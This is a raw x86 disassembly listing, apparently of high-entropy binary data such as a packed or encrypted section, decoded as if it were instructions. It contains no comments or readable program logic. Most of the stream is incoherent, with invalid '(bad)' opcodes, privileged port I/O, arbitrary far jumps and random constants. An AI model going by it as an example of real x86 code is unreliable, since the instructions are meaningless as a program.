  40763a:	or     eax,0x737a0ce6
  40763f:	jbe    0x4075f7
  407641:	pop    edx
  407642:	in     al,dx
  407643:	ins    BYTE PTR es:[edi],dx
  407644:	neg    DWORD PTR [eax]
  407646:	neg    bl
  407648:	ins    BYTE PTR es:[edi],dx
  407649:	ins    DWORD PTR es:[edi],dx
  40764a:	outs   dx,DWORD PTR ds:[esi]
  40764b:	mov    al,0xb5
  40764d:	cmp    DWORD PTR [eax+esi*1+0x18],esp
  407651:	mov    dl,0x31
  407653:	sbb    cl,dl
  407655:	sbb    ebp,DWORD PTR [eax+edx*4+0x24]
  407659:	sub    eax,0x396ad5a
  40765e:	pop    es
  40765f:	outs   dx,DWORD PTR ds:[esi]
  407660:	es pop eax
  407662:	rcr    BYTE PTR [eax],0x1f
  407665:	mov    dl,0x14
  407667:	xchg   edx,eax
  407668:	lds    esp,FWORD PTR [ebx+0x1544e8b9]
  40766e:	into   
  40766f:	cmp    al,0x82
  407671:	and    eax,0x556fb51c
  407676:	fnstcw WORD PTR [ebx]
  407678:	in     al,dx
  407679:	push   ebx
  40767a:	inc    edx
  40767b:	or     BYTE PTR ds:0x718071b4,al
  407681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407682:	add    DWORD PTR [eax],edx
  407684:	loopne 0x4076c6
  407686:	bound  eax,QWORD PTR [edx]
  407688:	pop    esp
  407689:	add    DWORD PTR [esi-0x340d0342],ebp
  40768f:	outs   dx,DWORD PTR ds:[esi]
  407690:	loope  0x4076a4
  407692:	mov    dl,0x2e
  407694:	or     esp,DWORD PTR [ecx]
  407696:	add    DWORD PTR cs:[edi],ebp
  407699:	add    edx,edi
  40769b:	sub    esp,0x589e2789
  4076a1:	(bad)  
  4076a2:	retf   
  4076a3:	mov    eax,0xc0035947
  4076a8:	xor    DWORD PTR [ecx+edx*2],esp
  4076ab:	jmp    0xe3c4:0x3f75a94c
  4076b2:	add    ecx,DWORD PTR [ebx]
  4076b4:	adc    BYTE PTR [edx+0x60],al
  4076b7:	mov    ecx,fs
  4076b9:	retf   0xdbd5
  4076bc:	push   0xd98f73b3
  4076c1:	adc    eax,0x42660771
  4076c6:	loopne 0x4076e7
  4076c8:	adc    BYTE PTR [eax],ah
  4076ca:	mov    ch,0xdb
  4076cc:	inc    esi
  4076cd:	loop   0x4076d0
  4076cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d0:	out    0xc3,eax
  4076d2:	jnp    0x40765e
  4076d4:	push   edx
  4076d5:	daa    
  4076d6:	int3   
  4076d7:	mov    ah,0x84
  4076d9:	mov    ecx,0x2adc8bf
  4076de:	inc    esp
  4076df:	dec    esi
  4076e0:	mov    ds:0x68c89472,al
  4076e5:	daa    
  4076e6:	sti    
  4076e7:	je     0x407743
  4076e9:	jnp    0x4076df
  4076eb:	pop    edx
  4076ec:	pop    es
  4076ed:	or     al,0x7a
  4076ef:	xlat   BYTE PTR ds:[ebx]
  4076f0:	sbb    esi,esi
  4076f2:	into   
  4076f3:	mov    bl,0xd1
  4076f5:	fwait
  4076f6:	mov    cl,0xb3
  4076f8:	sub    eax,ebx
  4076fa:	fisubr DWORD PTR [ebx+esi*1+0x1a]
  4076fe:	neg    cl
  407700:	fcomp  QWORD PTR [eax+esi*4]
  407703:	mov    bl,0xbd
  407705:	leave  
  407706:	jo     0x4076ab
  407708:	iret   
  407709:	push   0x3468c1b4
  40770e:	inc    eax
  40770f:	dec    edx
  407710:	mov    DWORD PTR [edx+0x9],edx
  407713:	inc    edx
  407714:	mov    ch,0x91
  407716:	xor    al,BYTE PTR [ecx+0x48]
  407719:	adc    DWORD PTR [edx-0x73b5bdd7],0xc41815b1
  407723:	dec    esi
  407724:	enter  0x4f95,0x75
  407728:	pop    ss
  407729:	adc    BYTE PTR [eax-0x2b],dh
  40772c:	div    BYTE PTR [esi+0xc050e4c]
  407732:	and    DWORD PTR [ecx+0x15c9f6b5],0xe053100
  40773c:	sub    DWORD PTR [ebx],0xeafabeaf
  407742:	jns    0x407780
  407744:	cmp    al,ah
  407746:	jl     0x40775a
  407748:	scas   eax,DWORD PTR es:[edi]
  407749:	jecxz  0x407723
  40774b:	les    ecx,FWORD PTR [eax+ebp*1]
  40774e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40774f:	xchg   esp,eax
  407750:	lds    esp,FWORD PTR [ebx-0x71]
  407753:	cmp    eax,0xb0668eb6
  407758:	push   es
  407759:	and    BYTE PTR [ebx+0x49],0x91
  40775d:	out    0x3f,eax
  40775f:	and    eax,0x60ab6885
  407764:	add    al,BYTE PTR [eax]
  407766:	or     BYTE PTR [ecx-0x1b3675ae],al
  40776c:	nop
  40776d:	fstp   TBYTE PTR [ebx-0x70b551e7]
  407773:	jb     0x407724
  407775:	sbb    eax,0x99b28257
  40777a:	jmp    0x5:0xb1d2885a
  407781:	inc    edx
  407782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407783:	fldenv [ecx-0x6d4b5edc]
  407789:	sub    al,0x57
  40778b:	sbb    al,0xe4
  40778d:	(bad)  
  40778e:	(bad)  
  40778f:	jbe    0x4077c6
  407791:	mov    BYTE PTR [edx],al
  407793:	sub    DWORD PTR [ebx-0x5c],ecx
  407796:	sub    BYTE PTR [ecx+0x272a4e62],dl
  40779c:	and    al,0x6a
  40779e:	dec    edx
  40779f:	daa    
  4077a0:	sub    eax,0xfa4bb4e8
  4077a5:	fstp   QWORD PTR [ebx+0x30aef46c]
  4077ab:	sbb    dl,BYTE PTR [esp+ecx*4-0x3ca4dafa]
  4077b2:	mov    WORD PTR [ebp+0x7bf430d],gs
  4077b8:	mov    ebp,0x6830628e
  4077bd:	mov    bl,0x39
  4077bf:	fisub  DWORD PTR [eax+0x1a30183f]
  4077c5:	ins    DWORD PTR es:[edi],dx
  4077c6:	mov    cl,0xb1
  4077c8:	mov    cl,0x49
  4077ca:	xchg   edx,eax
  4077cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077cc:	dec    eax
  4077cd:	xchg   ebp,eax
  4077ce:	loopne 0x407802
  4077d0:	and    DWORD PTR ds:0x343ee7d6,eax
  4077d6:	add    DWORD PTR [edx-0x490e0f57],esp
  4077dc:	clc    
  4077dd:	not    DWORD PTR [ecx+0x0]
  4077e0:	jno    0x407836
  4077e2:	mov    ecx,0x80f5f623
  4077e7:	push   ds
  4077e8:	jo     0x4077f4
  4077ea:	clc    
  4077eb:	jo     0x407790
  4077ed:	dec    eax
  4077ee:	mov    DWORD PTR [ebx],eax
  4077f0:	mov    BYTE PTR [ecx],bl
  4077f2:	mov    al,0x67
  4077f4:	lods   eax,DWORD PTR ds:[esi]
  4077f5:	mov    ebp,0x6f1bc6f5
  4077fa:	mov    WORD PTR [ebp-0x77bd78f0],es
  407800:	fild   DWORD PTR [edx-0x78]
  407803:	jge    0x4077a1
  407805:	lahf   
  407806:	loop   0x407835
  407808:	sub    ebp,esp
  40780a:	fwait
  40780b:	sar    BYTE PTR [ecx-0x41],0x7d
  40780f:	jb     0x4077ff
  407811:	fdivr  QWORD PTR [ecx]
  407813:	ret    
  407814:	lahf   
  407815:	arpl   WORD PTR [ecx+0x3],bx
  407818:	shl    BYTE PTR [ecx],0x44
  40781b:	sar    BYTE PTR [ebx-0x5c],0x94
  40781f:	dec    eax
  407820:	lahf   
  407821:	(bad)  
  407822:	sbb    edi,ebx
  407824:	add    BYTE PTR [esi],cl
  407826:	cmpxchg8b QWORD PTR [esi+eiz*2+0x12]
  40782b:	lods   al,BYTE PTR ds:[esi]
  40782c:	jp     0x407845
  40782e:	repz sub ecx,DWORD PTR ds:0xc7040958
  407835:	popf   
  407836:	aaa    
  407837:	xor    edx,DWORD PTR [eax]
  407839:	and    BYTE PTR [edi+ebx*8-0x1ab63412],dh
  407840:	mov    bh,0x3b
  407842:	aas    
  407843:	test   BYTE PTR [ecx+0x3722ac0a],dh
  407849:	adc    dh,BYTE PTR [esp+eiz*2+0x2870133f]
  407850:	rcr    BYTE PTR [edx],0xef
  407853:	or     BYTE PTR [esp+ecx*2+0x42],dh
  407857:	leave  
  407858:	sub    DWORD PTR [ecx-0x395c5bc6],ecx
  40785e:	je     0x4078ba
  407860:	sti    
  407861:	mov    WORD PTR [edx-0x49],?
  407864:	fcomp  st(2)
  407866:	mov    eax,0x12e0d6c9
  40786b:	fwait
  40786c:	sbb    ebx,DWORD PTR [edx+0x27042733]
  407872:	dec    edi
  407873:	je     0x40788e
  407875:	outs   dx,BYTE PTR ds:[esi]
  407876:	je     0x407851
  407878:	ficomp WORD PTR [edx]
  40787a:	xor    bl,BYTE PTR [esi+esi*8]
  40787d:	jmp    0x64d33f8
  407882:	add    edi,edx
  407884:	std    
  407885:	and    DWORD PTR [edx+0x25],edx
  407888:	dec    eax
  407889:	test   eax,0x21049248
  40788e:	pop    esp
  40788f:	fiadd  WORD PTR [ebx+0x45130631]
  407895:	sub    ebp,esi
  407897:	(bad)  
  407898:	and    bl,BYTE PTR [edx-0x3bfea91b]
  40789e:	xor    DWORD PTR [ebp-0x6d],ecx
  4078a1:	inc    esp
  4078a2:	or     BYTE PTR [ecx],dh
  4078a4:	les    esi,FWORD PTR [ecx]
  4078a6:	mov    bl,dl
  4078a8:	inc    edi
  4078a9:	pop    ebp
  4078aa:	mov    edi,0x9cb8e1
  4078af:	scas   eax,DWORD PTR es:[edi]
  4078b0:	pop    esp
  4078b1:	mov    ecx,0x9c2de572
  4078b6:	jecxz  0x4078aa
  4078b8:	stos   BYTE PTR es:[edi],al
  4078b9:	adc    dl,ah
  4078bb:	sti    
  4078bc:	ficomp WORD PTR [edi]
  4078be:	jno    0x407919
  4078c0:	or     BYTE PTR [ecx-0x361b0d81],dh
  4078c6:	pop    ds
  4078c7:	sti    
  4078c8:	mov    al,0xe7
  4078ca:	sbb    al,BYTE PTR [eax]
  4078cc:	mov    fs,WORD PTR [ecx]
  4078ce:	push   edx
  4078cf:	test   eax,0xe5a7c107
  4078d4:	add    cl,BYTE PTR [eax]
  4078d6:	add    DWORD PTR ds:0x49800054,0xdf95eb89
  4078e0:	imul   esp,DWORD PTR [edi-0xe7be7ef],0xe7bb7be7
  4078ea:	or     dl,0xbc
  4078ed:	or     bl,bl
  4078ef:	test   al,dh
  4078f1:	or     al,0xc2
  4078f3:	sti    
  4078f4:	pop    ds
  4078f5:	lods   al,BYTE PTR ds:[esi]
  4078f6:	add    cl,dl
  4078f8:	add    dl,cl
  4078fa:	add    DWORD PTR [edx+ebx*1],esp
  4078fd:	add    DWORD PTR [esi],0x9fd92d32
  407903:	or     DWORD PTR [esi-0x4729791b],ebp
  407909:	mov    al,ds:0xe8d9ced7
  40790e:	pop    ss
  40790f:	in     al,dx
  407910:	fcomp  QWORD PTR [edx-0x378f45cf]
  407916:	inc    esi
  407917:	ja     0x40795b
  407919:	mov    edi,0x3bc0c073
  40791e:	sub    al,0x3b
  407920:	jmp    0x8d1d7f4a
  407925:	lea    eax,[ecx+0x184ddfa0]
  40792b:	push   cs
  40792c:	sti    
  40792d:	or     al,0x7a
  40792f:	sbb    eax,0x830ebd7a
  407934:	inc    BYTE PTR [eax+0x2108e18d]
  40793a:	adc    eax,0x5448492a
  40793f:	adc    BYTE PTR [eax-0x4a581e36],0x18
  407946:	mov    ebx,0x58a3e050
  40794b:	inc    esp
  40794c:	in     eax,dx
  40794d:	leave  
  40794e:	mov    ?,WORD PTR [eax]
  407950:	sbb    eax,0xc4626b8e
  407955:	adc    ch,BYTE PTR [esi+0x42918c6d]
  40795b:	mov    BYTE PTR [esi],bh
  40795d:	rol    bh,1
  40795f:	mov    cl,0x89
  407961:	lahf   
  407962:	imul   ebx,DWORD PTR [ebx+esi*1-0x3f9bbde9],0xde6f375b
  40796d:	jl     0x40797a
  40796f:	bound  ebx,QWORD PTR [si+0x5297]
  407974:	mov    esi,0x8021c1ee
  407979:	lds    edi,FWORD PTR [eax+edi*1+0x1c]
  40797d:	dec    al
  40797f:	fwait
  407980:	sbb    DWORD PTR [ebx+0x0],ebp
  407983:	mov    eax,0xcfddf947
  407988:	jge    0x4079d8
  40798a:	sbb    BYTE PTR [ebx-0x22],ah
  40798d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40798e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40798f:	je     0x4079da
  407991:	inc    eax
  407992:	fisub  WORD PTR [ebx+0x521012e]
  407998:	jnp    0x407a15
  40799a:	pop    es
  40799b:	mov    WORD PTR [edi],cs
  40799d:	adc    ebp,esi
  40799f:	lods   eax,DWORD PTR ds:[esi]
  4079a0:	outs   dx,DWORD PTR ds:[esi]
  4079a1:	cmp    eax,DWORD PTR [edx-0x54]
  4079a4:	out    dx,eax
  4079a5:	rol    ebx,0xff
  4079a8:	ja     0x407a07
  4079aa:	mov    WORD PTR [edi],es
  4079ac:	add    ecx,DWORD PTR ds:0xcace748
  4079b2:	pop    ss
  4079b3:	push   ss
  4079b4:	add    ah,BYTE PTR [ecx]
  4079b6:	inc    ecx
  4079b7:	leave  
  4079b8:	xchg   esp,eax
  4079b9:	push   esi
  4079ba:	mov    ebx,0xd11dd245
  4079bf:	out    dx,al
  4079c0:	or     edi,DWORD PTR [edx]
  4079c2:	and    eax,DWORD PTR [ebp-0x45]
  4079c5:	shrd   DWORD PTR [esi],ebx,cl
  4079c8:	test   al,0xb6
  4079ca:	and    eax,0x25052597
  4079cf:	sti    
  4079d0:	mov    edx,0x8278c6e0
  4079d5:	sbb    al,0x8f
  4079d7:	ror    esp,0x10
  4079da:	jbe    0x407a28
  4079dc:	dec    ebx
  4079dd:	mov    cs,WORD PTR [ecx+0x55]
  4079e0:	dec    esi
  4079e1:	cmp    edi,DWORD PTR [ecx-0x728a44b3]
  4079e7:	jle    0x407a00
  4079e9:	cli    
  4079ea:	mov    ebp,0x8751cd84
  4079ef:	inc    ecx
  4079f0:	pop    edi
  4079f1:	ror    DWORD PTR [esi+0x2d],1
  4079f4:	lods   eax,DWORD PTR ds:[esi]
  4079f5:	xchg   esi,eax
  4079f6:	mov    ds:0xd2b452dd,al
  4079fb:	test   BYTE PTR [ecx*2+0x6d33985c],ah
  407a02:	cmp    DWORD PTR [esi],edx
  407a04:	mov    eax,ds:0x569a5412
  407a09:	dec    esp
  407a0a:	mov    ds:0x9b5459f9,al
  407a0f:	push   ebx
  407a10:	out    dx,al
  407a11:	cwde   
  407a12:	sbb    DWORD PTR [edi+esi*8],esi
  407a15:	xor    eax,0xb1df87bf
  407a1a:	xor    al,0x81
  407a1c:	and    al,0xde
  407a1e:	push   ds
  407a1f:	or     DWORD PTR [ebx-0x35],0x3e02db5a
  407a26:	or     BYTE PTR [eax+esi*1+0x6],bh
  407a2a:	sub    eax,0xb1c58421
  407a2f:	xchg   DWORD PTR [ebx-0x40],ebx
  407a32:	lds    eax,FWORD PTR [ebx+0x528b8383]
  407a38:	retf   0xc00b
  407a3b:	adc    eax,0x1c6e6f
  407a40:	mov    ebx,0x9038e4de
  407a45:	push   edx
  407a46:	out    dx,al
  407a47:	jecxz  0x407a0b
  407a49:	sahf   
  407a4a:	pop    ecx
  407a4b:	stos   DWORD PTR es:[edi],eax
  407a4c:	aad    0xfa
  407a4e:	mov    eax,ds:0xd72e38
  407a53:	jo     0x4079e4
  407a55:	push   edx
  407a56:	push   0xffffffdd
  407a58:	dec    ecx
  407a59:	xchg   esp,eax
  407a5a:	jp     0x407a26
  407a5c:	pop    edx
  407a5d:	mov    ecx,DWORD PTR [edx+0x12]
  407a60:	dec    esp
  407a61:	pop    ecx
  407a62:	mov    edx,0xd14d3fde
  407a67:	pop    edx
  407a68:	jae    0x407a5f
  407a6a:	fisubr DWORD PTR ds:0x97d0d966
  407a70:	mov    esi,0xcaf01817
  407a75:	lods   ax,WORD PTR ds:[esi]
  407a77:	push   edi
  407a78:	mov    esp,0xd754901f
  407a7d:	mov    eax,DWORD PTR [esi+0x1d]
  407a80:	lods   al,BYTE PTR ds:[esi]
  407a81:	add    al,0x1c
  407a83:	aaa    
  407a84:	ds inc ecx
  407a86:	dec    ecx
  407a87:	inc    ebx
  407a88:	call   0x86d6:0xcd6dba08
  407a8f:	loop   0x407a12
  407a91:	xchg   ebx,eax
  407a92:	xchg   esi,eax
  407a93:	adc    ebx,DWORD PTR [ebx-0x7e]
  407a96:	int    0x21
  407a98:	ins    BYTE PTR es:[edi],dx
  407a99:	ins    BYTE PTR es:[edi],dx
  407a9a:	or     dl,dl
  407a9c:	and    al,0xc5
  407a9e:	xchg   edx,eax
  407a9f:	mov    ds:0x1ca29775,al
  407aa4:	push   edx
  407aa5:	call   0xf25b0f5d
  407aaa:	adc    cl,BYTE PTR [edx-0x4cf2f5ee]
  407ab0:	adc    cl,dl
  407ab2:	mov    ds:0x9415ecc4,al
  407ab7:	aaa    
  407ab8:	dec    ebx
  407ab9:	dec    esp
  407aba:	cdq    
  407abb:	and    ebp,ebp
  407abd:	cwde   
  407abe:	push   esp
  407abf:	into   
  407ac0:	dec    eax
  407ac1:	aad    0x9c
  407ac3:	outs   dx,BYTE PTR ds:[esi]
  407ac4:	mov    edx,0x27dd374f
  407ac9:	xchg   ebp,eax
  407aca:	jae    0x407b06
  407acc:	jmp    0x6772d165
  407ad1:	rcl    BYTE PTR [ebx+0x6c],1
  407ad4:	or     al,0x5a
  407ad6:	or     al,0xfa
  407ad8:	pop    ebp
  407ad9:	jp     0x407ab8
  407adb:	cs in  eax,dx
  407add:	dec    esi
  407ade:	fwait
  407adf:	shl    DWORD PTR [eax+0x48],0x7f
  407ae3:	xor    BYTE PTR [eax],ah
  407ae5:	dec    ecx
  407ae6:	sbb    al,0x28
  407ae8:	and    al,0x49
  407aea:	adc    BYTE PTR [edx+0x9],0xd6
  407aee:	sbb    dh,BYTE PTR [esi+esi*1-0x47fa4db9]
  407af5:	jae    0x407a9b
  407af7:	and    bh,ah
  407af9:	setns  BYTE PTR [eax-0x876dfb3]
  407b00:	sbb    eax,0x2e308be5
  407b05:	in     eax,0x5b
  407b07:	dec    eax
  407b08:	sub    DWORD PTR [ebx-0x4f5e1dd1],eax
  407b0e:	pop    ebp
  407b0f:	cli    
  407b10:	adc    al,0xf0
  407b12:	call   0xe148d5f3
  407b17:	jecxz  0x407ad7
  407b19:	dec    esp
  407b1a:	or     ebx,0x115c5145
  407b20:	inc    edx
  407b21:	mov    esp,0x97146384
  407b26:	jl     0x407ade
  407b28:	in     eax,0xcb
  407b2a:	pop    ss
  407b2b:	cs pop esp
  407b2d:	cmp    BYTE PTR [eax-0x1c],bh
  407b30:	xchg   ecx,eax
  407b31:	inc    edi
  407b32:	fidiv  WORD PTR [ebp+0x6b9ed1]
  407b38:	mov    eax,0xdbb56947
  407b3d:	daa    
  407b3e:	xor    BYTE PTR [esi+0x47],ah
  407b41:	js     0x407aea
  407b43:	lahf   
  407b44:	cmc    
  407b45:	jns    0x407b43
  407b47:	and    edi,esp
  407b49:	jmp    esi
  407b4b:	int    0x5d
  407b4d:	(bad)
  407b53:	sbb    bh,BYTE PTR gs:[edi-0x59]
  407b57:	fdivr  QWORD PTR [ebx+0x6b8d29fb]
  407b5d:	push   esp
  407b5e:	retf   0x36fd
  407b61:	scas   eax,DWORD PTR es:[edi]
  407b62:	out    dx,eax
  407b63:	xchg   BYTE PTR [eax],dl
  407b65:	nop
  407b66:	sub    BYTE PTR [ecx-0x59],al
  407b69:	add    eax,ebx
  407b6b:	or     eax,0x9f74d9d8
  407b70:	lods   eax,DWORD PTR ds:[esi]
  407b71:	adc    DWORD PTR [esp+ebx*4+0x6b0c301f],esi
  407b78:	mov    al,ds:0x42cda034
  407b7d:	stc    
  407b7e:	mov    ch,0x71
  407b80:	push   ebx
  407b82:	xor    ah,BYTE PTR [ecx+0x40da09d0]
  407b88:	pop    esi
  407b89:	inc    eax
  407b8a:	pop    esi
  407b8b:	out    dx,al
  407b8c:	mov    eax,0x141c0532
  407b91:	mov    al,0x67
  407b93:	dec    edx
  407b94:	dec    esp
  407b95:	test   eax,0x8a19f391
  407b9a:	or     DWORD PTR [edx+0x77],ebp
  407b9d:	and    dl,0x90
  407ba0:	xchg   esi,eax
  407ba1:	mov    eax,0xd21d4745
  407ba6:	dec    esi
  407ba7:	daa    
  407ba8:	hlt    
  407ba9:	pop    edx
  407baa:	xchg   edi,eax
  407bab:	jmp    0x8f1db554
  407bb0:	mov    al,ds:0xe194bdf
  407bb5:	cli    
  407bb6:	je     0x407b72
  407bb8:	ins    DWORD PTR es:[edi],dx
  407bb9:	cmp    ch,ch
  407bbb:	push   cs
  407bbc:	sbb    eax,ebx
  407bbe:	and    ebp,ebx
  407bc0:	outs   dx,BYTE PTR ds:[esi]
  407bc1:	lahf   
  407bc2:	push   esi
  407bc3:	retf   
  407bc4:	mov    cl,0x7
  407bc6:	xchg   ebp,eax
  407bc7:	and    al,0x28
  407bc9:	jmp    0x3786adca
  407bce:	push   es
  407bcf:	push   0xc2b5b5c5
  407bd4:	scas   eax,DWORD PTR es:[edi]
  407bd5:	mov    al,0x54
  407bd7:	add    eax,0x32777d8d
  407bdc:	cmp    DWORD PTR [esi-0x63],edx
  407bdf:	ret    
  407be0:	inc    esp
  407be1:	add    edi,DWORD PTR [ecx-0x529a8684]
  407be7:	push   ebp
  407be8:	(bad)  
  407be9:	cwde   
  407bea:	mov    dh,0x94
  407bec:	jb     0x407c4e
  407bee:	lods   eax,DWORD PTR ds:[esi]
  407bef:	cmp    eax,0xf014fc05
  407bf4:	mov    esp,ecx
  407bf6:	pop    edx
  407bf7:	inc    edx
  407bf8:	or     BYTE PTR [ebx],al
  407bfa:	dec    esp
  407bfb:	(bad)  
  407bfc:	jecxz  0x407bef
  407bfe:	in     eax,0xaf
  407c00:	jge    0x407bef
  407c02:	imul   edi,DWORD PTR [edi-0x14a9521],0xffffffd9
  407c09:	ror    DWORD PTR [edi+0x3f],cl
  407c0c:	jge    0x407bef
  407c0e:	js     0x407c3f
  407c10:	out    dx,eax
  407c11:	out    dx,al
  407c12:	mov    dl,0x6
  407c14:	cmp    BYTE PTR [ebx+0x14],0xa3
  407c18:	cmc    
  407c19:	jnp    0x407bbf
  407c1b:	adc    ch,ch
  407c1d:	and    al,0x49
  407c1f:	nop
  407c20:	push   edx
  407c21:	and    ah,BYTE PTR [ebp-0x6d74a4bc]
  407c27:	adc    ch,BYTE PTR [esi+eiz*8+0x4a038dfa]
  407c2e:	jge    0x407bca
  407c30:	stos   BYTE PTR es:[edi],al
  407c31:	imul   DWORD PTR [edi-0xa]
  407c34:	stos   BYTE PTR es:[edi],al
  407c35:	out    dx,eax
  407c36:	lods   eax,DWORD PTR ss:[esi]
  407c38:	mov    bh,0x81
  407c3a:	into   
  407c3b:	(bad)  
  407c3c:	xlat   BYTE PTR ds:[ebx]
  407c3d:	mov    edi,0xd254177f
  407c42:	sub    DWORD PTR [ebx-0x41],edi
  407c45:	add    eax,ebx
  407c47:	add    DWORD PTR [ebp+ecx*1+0x61],ebp
  407c4b:	addr16 add al,0xed
  407c4e:	ss sub ch,ah
  407c51:	cs addr16 xor al,0x68
  407c55:	or     eax,esi
  407c57:	cmp    al,BYTE PTR [eax]
  407c59:	rcr    BYTE PTR [esi],1
  407c5b:	or     al,0xb4
  407c5d:	jbe    0x407c7f
  407c5f:	push   eax
  407c60:	cli    
  407c61:	std    
  407c62:	add    DWORD PTR [edx+ecx*2],ebx
  407c65:	sbb    eax,0x4eb401c0
  407c6a:	sub    BYTE PTR [edx+eax*2+0x56],cl
  407c6e:	mov    ah,0x29
  407c70:	cmc    
  407c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c72:	fistp  DWORD PTR [edi-0x3e]
  407c75:	popa   
  407c76:	or     DWORD PTR [ebx-0x5d],esp
  407c79:	mov    cl,0xba
  407c7b:	test   cl,ch
  407c7d:	pushf  
  407c7e:	xchg   esp,eax
  407c7f:	inc    ebx
  407c80:	aam    0xc1
  407c82:	add    al,0xc5
  407c84:	xchg   esp,eax
  407c85:	mov    dh,0xb8
  407c87:	inc    ebp
  407c88:	dec    ebx
  407c89:	sbb    al,0xd2
  407c8b:	dec    esi
  407c8c:	imul   cl
  407c8e:	mov    ch,0xae
  407c90:	ror    DWORD PTR [edx+0x32],cl
  407c93:	fisubr DWORD PTR [ecx]
  407c95:	or     al,0x7a
  407c97:	ins    DWORD PTR es:[edi],dx
  407c98:	xchg   BYTE PTR [ebx],bl
  407c9a:	cmp    eax,0x6e949d3a
  407c9f:	mov    bh,0xcd
  407ca1:	jo     0x407d06
  407ca3:	inc    eax
  407ca4:	mov    bh,0xdb
  407ca6:	mov    ds:0xb4b8eedd,eax
  407cab:	push   0x22421121
  407cb0:	test   esp,esi
  407cb2:	mov    bl,0x39
  407cb4:	leave  
  407cb5:	stos   BYTE PTR es:[edi],al
  407cb6:	xchg   edi,eax
  407cb7:	or     al,BYTE PTR ds:[edx+eiz*2]
  407cbb:	gs (bad) 
  407cbe:	frstor [edx+eax*1+0x61]
  407cc2:	pop    edi
  407cc3:	sbb    BYTE PTR [edx+0x4efe3cdd],bh
  407cc9:	mov    esi,0x23001589
  407cce:	mov    ch,0xd6
  407cd0:	sbb    esp,edi
  407cd2:	iret   
  407cd3:	lahf   
  407cd4:	jg     0x407d48
  407cd6:	ja     0x407d4f
  407cd8:	test   ecx,0xea7a9ea7
  407cde:	addr16 mov edi,0xfc6f8df1
  407ce4:	(bad)  
  407ce5:	dec    edi
  407ce6:	aas    
  407ce7:	std    
  407ce8:	hlt    
  407ce9:	or     esi,edi
  407ceb:	jmp    0xab7f85
  407cf0:	mov    eax,0x7f5a3167
  407cf5:	inc    eax
  407cf6:	dec    eax
  407cf7:	sub    DWORD PTR [ebp+0x4a55a94f],esp
  407cfd:	mov    ecx,0xfb14ad97
  407d02:	sti    
  407d03:	mov    bh,0xb9
  407d05:	mov    ebp,0x8ecac927
  407d0a:	add    BYTE PTR [bp+di],ch
  407d0d:	pop    es
  407d0e:	aad    0xdc
  407d10:	scas   eax,DWORD PTR es:[edi]
  407d11:	cmp    esp,DWORD PTR [ecx-0x3f]
  407d14:	sub    al,ah
  407d16:	frstor [ebx+0x15]
  407d19:	push   es
  407d1a:	mov    ebx,DWORD PTR [ebx]
  407d1c:	mov    cl,0x18
  407d1e:	push   es
  407d1f:	sub    ecx,DWORD PTR [ebx+0x1]
  407d22:	imul   ecx,DWORD PTR [edx],0xfa0c36dd
  407d28:	xor    BYTE PTR [edx],bl
  407d2a:	cmp    al,BYTE PTR [eax+0x50]
  407d2d:	push   0xffffff91
  407d2f:	sbb    BYTE PTR [ecx-0x44],ch
  407d32:	inc    ebp
  407d33:	popa   
  407d34:	or     al,0x94
  407d36:	(bad)  
  407d37:	jnp    0x407d39
  407d39:	add    ah,BYTE PTR [ebx-0x24]
  407d3c:	(bad)  
  407d3d:	shr    BYTE PTR [ebx],cl
  407d3f:	mov    edi,0x94318e31
  407d44:	jp     0x407d07
  407d46:	push   ds
  407d47:	ret    0xd2be
  407d4a:	add    BYTE PTR cs:[edx+0x28d28a34],ah
  407d51:	repnz mov ds:0x5547a14d,al
  407d57:	cdq    
  407d58:	mov    ds:0xe58d284,al
  407d5d:	(bad)  
  407d5e:	out    0xa6,al
  407d60:	sub    DWORD PTR [eax],edx
  407d62:	xchg   BYTE PTR gs:[eax],ch
  407d65:	xor    cl,ah
  407d67:	cmp    BYTE PTR [ebx+0x5c],al
  407d6a:	popf   
  407d6b:	and    cl,BYTE PTR [esi+eax*2+0x22]
  407d6f:	or     bh,BYTE PTR [edx-0x17]
  407d72:	pushf  
  407d73:	outs   dx,BYTE PTR ds:[esi]
  407d74:	jp     0x407cf9
  407d76:	jbe    0x407dca
  407d78:	shr    BYTE PTR [ebx+0x69],cl
  407d7b:	cli    
  407d7c:	popf   
  407d7d:	xchg   edx,eax
  407d7e:	pop    esi
  407d7f:	retf   
  407d80:	ror    BYTE PTR [edx+0x5],1
  407d83:	in     eax,dx
  407d84:	xchg   esi,eax
  407d85:	and    cl,BYTE PTR [ebp+0x14]
  407d88:	dec    edx
  407d89:	sub    DWORD PTR [edx],edi
  407d8b:	popf   
  407d8c:	cs mov ebp,0xaf5e80fe
  407d92:	dec    edi
  407d93:	stos   DWORD PTR es:[edi],eax
  407d94:	fnsave [esi+0x26]
  407d97:	xchg   BYTE PTR [edi+0x13],ah
  407d9a:	mov    cl,0x92
  407d9c:	push   ds
  407d9d:	gs push esi
  407d9f:	test   ch,ch
  407da1:	ficomp WORD PTR [eax+ebp*4]
  407da4:	or     eax,0x43826aae
  407da9:	clc    
  407daa:	push   ds
  407dab:	pop    ds
  407dac:	fild   WORD PTR [edx+eax*4]
  407daf:	cmp    al,0xcf
  407db1:	(bad)  
  407db3:	fucom  st(5)
  407db5:	imul   ch
  407db7:	fistp  DWORD PTR [esp+edi*4+0x78]
  407dbb:	icebp  
  407dbc:	ret    
  407dbd:	(bad)  
  407dbf:	cld    
  407dc0:	lock out 0x9e,eax
  407dc3:	jnp    0x407db3
  407dc5:	mov    ecx,0xc7d8fe5f
  407dca:	imul   BYTE PTR ds:[ebp-0x28690a05]
  407dd1:	add    BYTE PTR [eax-0x71],dh
  407dd4:	mov    ds:0x8c31e492,al
  407dd9:	jno    0x407e18
  407ddb:	ds out dx,al
  407ddd:	test   DWORD PTR [edx],ebp
  407ddf:	sub    DWORD PTR [ecx+0x52],edx
  407de2:	jb     0x407e14
  407de4:	fsubrp st(7),st
  407de6:	neg    BYTE PTR [esi-0x21790640]
  407dec:	mov    DWORD PTR [esp+ebp*2],esi
  407def:	jae    0x407e59
  407df1:	hlt    
  407df2:	in     al,0xf7
  407df4:	leave  
  407df5:	push   edi
  407df6:	adc    ah,bh
